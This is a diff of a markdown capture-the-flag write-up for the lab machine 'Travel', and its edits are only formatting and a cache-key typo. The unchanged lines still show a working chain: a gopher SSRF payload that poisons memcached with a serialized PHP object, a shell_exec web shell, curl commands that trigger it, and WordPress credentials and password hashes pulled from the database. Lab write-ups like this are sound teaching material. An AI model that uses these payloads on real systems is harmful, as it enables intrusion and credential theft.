@@ -520,8 +520,8 @@ The data provided (contents of __`$url`__) will then be serialized and saved int
 
 To summarize specific to this scenario:
 
-1. The caching begins by taking three parameters that will be passed to the __`get_handler()`__ function in __Cache.php__ -- __`memcache://127.0.0.1:11211/?timeout=60&prefix=xct_`__, __`fe1fb813519a90aa175e3f3d721a07ca`__ (MD5 value of __`http://10.10.14.6/customfeed.xml`__), and `scp`
-2. The __`get_handler()`__ function will then determine what method of caching is needed based on the first parameter given; in this case, __memcache__ so the class definition of __`SimplePie_Cache_Memcache`__ will be used. The name of the data that will be written in the cache will follow the format --__`xct_`__ plus the value of __`md5("fe1fb813519a90aa175e3f3d721a07ca:scp")`__
+1. The caching begins by taking three parameters that will be passed to the __`get_handler()`__ function in __Cache.php__ -- __`memcache://127.0.0.1:11211/?timeout=60&prefix=xct_`__, __`fe1fb813519a90aa175e3f3d721a07ca`__ (MD5 value of __`http://10.10.14.6/customfeed.xml`__), and `spc`
+2. The __`get_handler()`__ function will then determine what method of caching is needed based on the first parameter given; in this case, __memcache__ so the class definition of __`SimplePie_Cache_Memcache`__ will be used. The name of the data that will be written in the cache will follow the format --__`xct_`__ plus the value of __`md5("fe1fb813519a90aa175e3f3d721a07ca:spc")`__
 3. A serialized version of the data will then be saved in to the cached catalogued with the prefix plus the newly generated md5.
 
 #### 3.3.2 Review of debug.php
@@ -534,7 +534,7 @@ The output for __debug.php__ last time when __`http://10.10.14.6/customfeed.xml`
    ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
 ```
 
-Following the process explained earlier, the marker generated (__`xct_54bddbaec1(...)`__) should be the same as __`md5(md5("http://10.10.14.6/customfeed.xml").":scp");`__ which is actually the case -- __54bddbaec1543acec82c7141efde0625__
+Following the process explained earlier, the marker generated (__`xct_54bddbaec1(...)`__) should be the same as __`md5(md5("http://10.10.14.6/customfeed.xml").":spc");`__ which is actually the case -- __54bddbaec1543acec82c7141efde0625__
 
 ### 3.4 Input Sanitation with template.php
 
@@ -674,7 +674,7 @@ echo serialize($afw);
 ?>
 ```
 
-The initialized variables, __`$file`__ and __`$data`__, were changed from being defined as __`private`__ to __`public` __ since the serialized data will be interpreted from outside the definition of the __`TemplateHelper`__ class.
+The initialized variables, __`$file`__ and __`$data`__, were changed from being defined as __`private`__ to __`public`__ since the serialized data will be interpreted from outside the definition of the __`TemplateHelper`__ class.
 
 ```shell
 $ php serialize.php
@@ -716,7 +716,7 @@ gopher://0.0.0.0:11211/_%0d%0aset%20SpyD3r%204%200%20145%0d%0aO:14:%22TemplateHe
 
 #### 3.5.4 Writing the gopher payload to cache
 
-```shell
+```console
 $ curl -G -d "custom_feed_url=gopher://0.0.0.0:11211/_%0d%0aset%20SpyD3r%204%200%20115%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:12:%22jebidiah.php%22%3Bs:4:%22data%22%3Bs:39:%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a" http://blog.travel.htb/awesome-rss/
 
 $ curl -G -d "debug=1" http://blog.travel.htb/awesome-rss/
@@ -749,7 +749,7 @@ public function load()
 }
 ```
 
-A check for a valid name(__xct_<md5>__) is performed so it might be necessary for the data to be deserialized. The earlier execution was written as __`SpyD3r`__ (Gopherus default) payload will be changed to:
+A check for a valid name(__xct_\<md5\>__) is performed so it might be necessary for the data to be deserialized. The earlier execution was written as __`SpyD3r`__ (Gopherus default) payload will be changed to:
 
 ```console
 gopher://0.0.0.0:11211/_%0d%0aset%20xct_54bddbaec1543acec82c7141efde0625%204%200%20115%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:12:%22jebidiah.php%22%3Bs:4:%22data%22%3Bs:39:%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
@@ -757,7 +757,7 @@ gopher://0.0.0.0:11211/_%0d%0aset%20xct_54bddbaec1543acec82c7141efde0625%204%200
 
 #### 3.5.6 Deserializing the right way
 
-```shell
+```console
 $ curl -G -d "custom_feed_url=gopher://0.0.0.0:11211/_%0d%0aset%20xct_54bddbaec1543acec82c7141efde0625%204%200%20115%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:12:%22jebidiah.php%22%3Bs:4:%22data%22%3Bs:39:%22%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a" --silent http://blog.travel.htb/awesome-rss/ >/dev/null
 
 $ curl -G -d "debug=1" http://blog.travel.htb/awesome-rss/
@@ -858,11 +858,11 @@ www-data@blog:/var/www/html$ cat wp-config.php
   
 www-data@blog:/var/www/html$ mysql -uwp -pfiFtDDV9LYe8Ti -e "SHOW DATABASES;"
 
-Database
-information_schema
-mysql
-performance_schema
-wp
+  Database
+  information_schema
+  mysql
+  performance_schema
+  wp
 
 www-data@blog:/var/www/html$ mysql -uwp -pfiFtDDV9LYe8Ti -e "USE wp; SHOW TABLES;"
   
@@ -873,7 +873,7 @@ www-data@blog:/var/www/html$ mysql -uwp -pfiFtDDV9LYe8Ti -e "USE wp; SHOW TABLES
 www-data@blog:/var/www/html$ mysql -uwp -pfiFtDDV9LYe8Ti -e "SELECT user_login,user_pass,user_nicename,user_email,display_name FROM wp.wp_users;"
 ```
 user_login | user_pass | user_nicename | user_email | display_name
---- | -- | --- | --- | ---
+--- | --- | --- | --- | ---
 admin | $P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/ | admin | admin@travel.htb | admin
 
 There are still no username aside from __`admin`__ listed in the database.
@@ -893,7 +893,7 @@ www-data@blog:/$ strings /opt/wordpress/backup-13-04-2020.sql
 It seems like from the SQL backup file, there were initially two users in the __`wp_users`__ table:
 
 user_login | user_pass | user_nicename | user_email | display_name
---- | -- | --- | --- | ---
+--- | --- | --- | --- | ---
 admin | $P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/ | admin | admin@travel.htb | admin
 lynik-admin | $P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc. | lynik-admin | lynik@travel.htb | Lynik Schmidt
 
